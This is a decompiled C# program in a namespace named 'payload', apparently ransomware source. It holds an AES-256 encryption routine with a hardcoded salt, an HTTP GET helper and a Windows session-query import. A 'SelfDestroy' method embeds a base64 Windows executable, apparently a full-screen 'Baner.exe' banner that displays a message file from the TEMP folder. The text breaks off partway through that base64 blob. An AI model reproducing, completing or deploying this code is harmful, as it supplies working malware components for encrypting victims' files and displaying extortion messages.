using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace payload
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1
		[DllImport("Wtsapi32.dll")]
		public static extern bool WTSQuerySessionInformationW(IntPtr hServer, int SessionId, int WTSInfoClass, out IntPtr ppBuffer, out IntPtr pBytesReturned);

		// Token: 0x06000002 RID: 2 RVA: 0x00002068 File Offset: 0x00000268
		private static string http_get(string url)
		{
			ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls;
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
			httpWebRequest.Method = "GET";
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			return streamReader.ReadToEnd();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000020C0 File Offset: 0x000002C0
		private static byte[] GenerateKey()
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.GenerateKey();
			return rijndaelManaged.Key;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000020E4 File Offset: 0x000002E4
		private static byte[] Encrypt(byte[] dataBytes)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			byte[] result = null;
			byte[] salt = new byte[]
			{
				68,
				66,
				23,
				78,
				132,
				53,
				182,
				35,
				172,
				214,
				62,
				6,
				224,
				103,
				240,
				44
			};
			using (MemoryStream memoryStream = new MemoryStream())
			{
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Program.KEY, salt, 1000);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(Program.KEY, rijndaelManaged.IV), CryptoStreamMode.Write))
				{
					cryptoStream.Write(dataBytes, 0, dataBytes.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
				rijndaelManaged.Clear();
			}
			return result;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000021D4 File Offset: 0x000003D4
		private static void SelfDestroy()
		{
			string s = "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FQIuAFsAFQIuAGMAMwIuAGsAXQJJAJMACgODAHsAbwKDAIMAagKDAIsAagKjAIsAagKjAHsAsAJAAXMAagInAFEAVgALASoBMAE/AQQAAQAFAAQAAACTBcMBAACgAcgBAADVBs4BAAA9CNQBAgAMAAMAAgANAAUAAQAOAAUAAgAPAAcAAgAQAAkABIAAAAEAAAAAAAAAAAAAAAAA6gUAAAIAAAAAAAAAAAAAAE0BPAAAAAAAAgAAAAAAAAAAAAAATQF6BwAAAAACAAAAAAAAAAAAAABNAY0EAAAAAAIAAAAAAAAAAAAAAFYBKwQAAAAAAAAAAAEAAACHBgAAuAAAAAEAAACdBgAAAAAAAABsYWJlbDEARm9ybTEAcGljdHVyZUJveDEAdGV4dEJveDEAPE1vZHVsZT4AU2l6ZUYAU3lzdGVtLklPAG1zY29ybGliAEZvcm0xX0xvYWQAYWRkX0xvYWQAQWRkAGdldF9SZWQARm9ybTFfRm9ybUNsb3NlZABhZGRfRm9ybUNsb3NlZABTeW5jaHJvbml6ZWQAZGVmYXVsdEluc3RhbmNlAHNldF9BdXRvU2NhbGVNb2RlAHNldF9TaXplTW9kZQBQaWN0dXJlQm94U2l6ZU1vZGUAc2V0X0ltYWdlAEdldEVudmlyb25tZW50VmFyaWFibGUASURpc3Bvc2FibGUAUnVudGltZVR5cGVIYW5kbGUAR2V0VHlwZUZyb21IYW5kbGUARmlsZQBzZXRfQm9yZGVyU3R5bGUAc2V0X0Zvcm1Cb3JkZXJTdHlsZQBGb250U3R5bGUAc2V0X05hbWUAZ2V0X05ld0xpbmUAc2V0X011bHRpbGluZQBUeXBlAGdldF9DdWx0dXJlAHNldF9DdWx0dXJlAHJlc291cmNlQ3VsdHVyZQBBcHBsaWNhdGlvblNldHRpbmdzQmFzZQBUZXh0Qm94QmFzZQBEaXNwb3NlAEVkaXRvckJyb3dzYWJsZVN0YXRlAFNUQVRocmVhZEF0dHJpYnV0ZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAEdlbmVyYXRlZENvZGVBdHRyaWJ1dGUARGVidWdnZXJOb25Vc2VyQ29kZUF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAEVkaXRvckJyb3dzYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAdmFsdWUAQmFuZXIuZXhlAHNldF9TaXplAHNldF9BdXRvU2l6ZQBzZXRfQ2xpZW50U2l6ZQBJU3VwcG9ydEluaXRpYWxpemUAU3RyaW5nAEZvcm0xX0Zvcm1DbG9zaW5nAGFkZF9Gb3JtQ2xvc2luZwBkaXNwb3NpbmcAU3lzdGVtLkRyYXdpbmcAZ2V0X0JsYWNrAHRleHRCb3gxX01vdXNlQ2xpY2sATGFiZWwAU3lzdGVtLkNvbXBvbmVudE1vZGVsAENvbnRhaW5lckNvbnRyb2wAUHJvZ3JhbQBTeXN0ZW0ARm9ybQByZXNvdXJjZU1hbgBNYWluAHNldF9TaG93SWNvbgBBcHBsaWNhdGlvbgBzZXRfTG9jYXRpb24AU3lzdGVtLkNvbmZpZ3VyYXRpb24AU3lzdGVtLkdsb2JhbGl6YXRpb24AU3lzdGVtLlJlZmxlY3Rpb24AQ29udHJvbENvbGxlY3Rpb24Ac2V0X1N0YXJ0UG9zaXRpb24ARm9ybVN0YXJ0UG9zaXRpb24AUnVuAHRleHRCb3gxX0tleURvd24AQ3VsdHVyZUluZm8AQml0bWFwAHNldF9UYWJTdG9wAHNldF9TaG93SW5UYXNrYmFyAHNlbmRlcgBnZXRfUmVzb3VyY2VNYW5hZ2VyAEZvcm1DbG9zZWRFdmVudEhhbmRsZXIARm9ybUNsb3NpbmdFdmVudEhhbmRsZXIAU3lzdGVtLkNvZGVEb20uQ29tcGlsZXIAQmFuZXIASUNvbnRhaW5lcgBzZXRfRm9yZUNvbG9yAHNldF9CYWNrQ29sb3IALmN0b3IALmNjdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBTeXN0ZW0uUmVzb3VyY2VzAEJhbmVyLkZvcm0xLnJlc291cmNlcwBCYW5lci5Qcm9wZXJ0aWVzLlJlc291cmNlcy5yZXNvdXJjZXMARGVidWdnaW5nTW9kZXMAZ2V0X2ltYWdlcwBCYW5lci5Qcm9wZXJ0aWVzAEVuYWJsZVZpc3VhbFN0eWxlcwBSZWFkQWxsTGluZXMAU2V0dGluZ3MARm9ybUNsb3NlZEV2ZW50QXJncwBNb3VzZUV2ZW50QXJncwBGb3JtQ2xvc2luZ0V2ZW50QXJncwBLZXlQcmVzc0V2ZW50QXJncwBLZXlFdmVudEFyZ3MAZ2V0X0NvbnRyb2xzAFN5c3RlbS5XaW5kb3dzLkZvcm1zAHNldF9BdXRvU2NhbGVEaW1lbnNpb25zAHNldF9TY3JvbGxCYXJzAFN5c3RlbUNvbG9ycwB0ZXh0Qm94MV9LZXlQcmVzcwBjb21wb25lbnRzAENvbmNhdABHZXRPYmplY3QAU2VsZWN0AEVuZEluaXQAQmVnaW5Jbml0AEdyYXBoaWNzVW5pdABnZXRfRGVmYXVsdABTZXRDb21wYXRpYmxlVGV4dFJlbmRlcmluZ0RlZmF1bHQARW52aXJvbm1lbnQASW5pdGlhbGl6ZUNvbXBvbmVudABQb2ludABzZXRfRm9udABTdXNwZW5kTGF5b3V0AHNldF9CYWNrZ3JvdW5kSW1hZ2VMYXlvdXQAUmVzdW1lTGF5b3V0AFBlcmZvcm1MYXlvdXQAZ2V0X1RleHQAc2V0X1RleHQAZ2V0X0luZm9UZXh0AFNob3cAZ2V0X1llbGxvdwBzZXRfVGFiSW5kZXgAUGljdHVyZUJveABzZXRfTWluaW1pemVCb3gAc2V0X01heGltaXplQm94AFRleHRCb3gAZ2V0X0Fzc2VtYmx5AHNldF9SZWFkT25seQAACVQARQBNAFAAABVcAG0AcwBnAHQAYQAuAHQAeAB0AAApTQBpAGMAcgBvAHMAbwBmAHQAIABTAGEAbgBzACAAUwBlAHIAaQBmAAANbABhAGIAZQBsADEAAAtJAGQAIAA9ACAAABdwAGkAYwB0AHUAcgBlAEIAbwB4ADEAABF0AGUAeAB0AEIAbwB4ADEAAAtGAG8AcgBtADEAADVCAGEAbgBlAHIALgBQAHIAbwBwAGUAcgB0AGkAZQBzAC4AUgBlAHMAbwB1AHIAYwBlAHMAAA1pAG0AYQBnAGUAcwAAADu54UVRUUNKkw2UsFCD5RMABCABAQgDIAABBSABARERBCABAQ4EIAEBAgUgAgEODgYgAQERgIkJBwUdDggSTQgCBAABDg4FAAIODg4FAAEdDg4DIAAOAwAADgYAAw4ODg4EBwESCAMHAQIGIAEBEYCtDCAFAQ4MEYC1EYC5BQYgAQESgLEFIAIBCAgGIAEBEYC9BiABARGAwQYgAQESgMUGIAEBEYDJBQAAEYDRBiABARGA0QYgAQERgNkFIAIBDAwGIAEBEYDdBiABARGA5QYgAQERgOkFIAASgO0GIAEBEoChBiABARGA8QYgAQERgPUFIAIBHBgGIAEBEoD5BiABARKA/QYgAQESgQEDAAABBAABAQIFAAEBEj0HBwMCEn0SfQgAARKBCRGBDQUgABKBEQcgAgEOEoERBQcBEoCBBgcCHBKAhQcgAhwOEoCBBAcBEhQIAAESgRUSgRUIt3pcVhk04IkIsD9ffxHVCjoDBhJBAwYSRQMGEkkDBhJNAwYSfQQGEoCBAwYSFAYgAgEcElUGIAIBHBJZBiACARwSXQYgAgEcEmEGIAIBHBJlBiACARwSaQQAABJ9BQAAEoCBBgABARKAgQUAABKAhQQAABIUBAgAEn0FCAASgIEFCAASgIUECAASFAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQAHAQAAAAAKAQAFQmFuZXIAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMjAAACkBACRlZTg3M2IxOS05OGZjLTQzZjMtOWEyYy05NWFiODJlOThiNmUAAAwBAAcxLjAuMC4wAAAEAQAAAEABADNTeXN0ZW0uUmVzb3VyY2VzLlRvb2xzLlN0cm9uZ2x5VHlwZWRSZXNvdXJjZUJ1aWxkZXIHNC4wLjAuMAAAWQEAS01pY3Jvc29mdC5WaXN1YWxTdHVkaW8uRWRpdG9ycy5TZXR0aW5nc0Rlc2lnbmVyLlNldHRpbmdzU2luZ2xlRmlsZUdlbmVyYXRvcggxMS4wLjAuMAAACAEAAgAAAAAAALQAAADOyu++AQAAAJEAAABsU3lzdGVtLlJlc291cmNlcy5SZXNvdXJjZVJlYWRlciwgbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5I1N5c3RlbS5SZXNvdXJjZXMuUnVudGltZVJlc291cmNlU2V0AgAAAAAAAAAAAAAAUEFEUEFEULQAAAC/OwAAzsrvvgEAAACRAAAAbFN5c3RlbS5SZXNvdXJjZXMuUmVzb3VyY2VSZWFkZXIsIG1zY29ybGliLCBWZXJzaW9uPTIuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSNTeXN0ZW0uUmVzb3VyY2VzLlJ1bnRpbWVSZXNvdXJjZVNldAIAAAABAAAAAQAAAGhTeXN0ZW0uRHJhd2luZy5CaXRtYXAsIFN5c3RlbS5EcmF3aW5nLCBWZXJzaW9uPTIuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYVBBRFBBRPGovF8AAAAANQEAAAxpAG0AYQBnAGUAcwAAAAAAQAABAAAA/////wEAAAAAAAAADAIAAABRU3lzdGVtLkRyYXdpbmcsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iMDNmNWY3ZjExZDUwYTNhBQEAAAAVU3lzdGVtLkRyYXdpbmcuQml0bWFwAQAAAAREYXRhBwICAAAACQMAAAAPAwAAAOc5AAAC/9j/4AAQSkZJRgABAQEAAAAAAAD/2wBDAAkGBxITEhUTExMWFhUXGB4bGRgYFxgYHxoaHxgaHh4eHR0YHiggHR4lGxoYITEhJSktLi4uGB8zODMsNygtLiv/2wBDAQoKCg4NDhsQEBsvJiAlLTAwLSstMC0tLSs1Ky8tLS8tLSstLS0tLS8tLS0tLS8tLS0tLS0tLS0vLS0tLS0tLS3/wAARCADCAQMDASIAAhEBAxEB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